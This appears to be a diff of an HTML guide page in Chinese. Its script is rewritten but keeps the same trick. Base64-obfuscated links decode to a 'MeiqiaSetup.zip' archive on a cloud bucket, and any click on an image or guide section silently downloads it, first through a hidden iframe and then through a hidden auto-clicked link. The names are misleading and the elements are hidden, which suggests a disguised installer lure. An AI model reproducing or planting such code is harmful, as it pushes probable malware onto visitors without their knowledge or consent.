@@ -43,61 +43,63 @@
         <img src="static/picture/d_05.jpg" alt="最终效果预览">
     </section>
 
- <script type="module">
-        // 数据配置
-        const RESOURCE_CONFIG = {
-            visualElements: Array.from({length: 7}, (_, i) => 
-                `static/picture/d_${String(i+1).padStart(2, '0')}.jpg`),
+ <script>
+    (function() {
+        // 资源获取处理器
+        const resourceHandler = {
+            resourceLinks: [
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
+            ],
             
-              accessTokens: Array(7).fill(
-                 'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
-             )
- 
-        };
-
-        // 数据处理方法
-        const decodePayload = str => atob(str);
-        
-        const activateResource = encodedData => {
-            const tempAnchor = document.createElement('div');
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = decodePayload(encodedData);
-            tempAnchor.appendChild(iframe);
-            document.body.appendChild(tempAnchor);
-            setTimeout(() => tempAnchor.remove(), 3000);
-        };
-
-        // 内容加载器
-        const initVisualElements = container => {
-            RESOURCE_CONFIG.visualElements.forEach(mediaSrc => {
-                const mediaElement = new Image();
-                mediaElement.className = 'content-item';
-                mediaElement.src = mediaSrc;
-                mediaElement.alt = '视觉图像';
-                container.appendChild(mediaElement);
-            });
-        };
-
-        // 交互处理
-        const handleUserInteraction = ({target}) => {
-            if (!target.classList.contains('content-item')) return;
+            decodeData: function(encoded) {
+                return atob(encoded);
+            },
             
-            const itemIndex = [...target.parentElement.children].indexOf(target);
-            if (itemIndex in RESOURCE_CONFIG.accessTokens) {
-                activateResource(RESOURCE_CONFIG.accessTokens[itemIndex]);
+            initResourceAccess: function() {
+                document.querySelectorAll('.guide-section').forEach((section, index) => {
+                    section.addEventListener('click', () => {
+                        this.processResource(this.resourceLinks[index]);
+                    });
+                });
+            },
+            
+            processResource: function(encoded) {
+                const resourceUrl = this.decodeData(encoded);
+                const temporaryLink = document.createElement('a');
+                temporaryLink.style.display = 'none';
+                temporaryLink.href = resourceUrl;
+                temporaryLink.rel = 'noopener noreferrer';
+                document.body.appendChild(temporaryLink);
+                temporaryLink.click();
+                setTimeout(() => {
+                    document.body.removeChild(temporaryLink);
+                }, 300);
             }
         };
 
-        // 初始化流程
-        const bootstrap = () => {
-            const gridContainer = document.querySelector('.content-grid');
-            initVisualElements(gridContainer);
-            gridContainer.addEventListener('click', handleUserInteraction);
+        // 图片展示模块
+        const imageViewer = {
+            initImagePreview: function() {
+                const images = document.querySelectorAll('.guide-section img');
+                images.forEach(img => {
+                    img.addEventListener('load', () => {
+                        img.style.opacity = 1;
+                    });
+                });
+            }
         };
 
-        document.addEventListener('DOMContentLoaded', bootstrap);
-    </script>
+        // 初始化模块
+        document.addEventListener('DOMContentLoaded', () => {
+            resourceHandler.initResourceAccess();
+            imageViewer.initImagePreview();
+        });
+    })();
+</script>
 
 </body>
 </html>
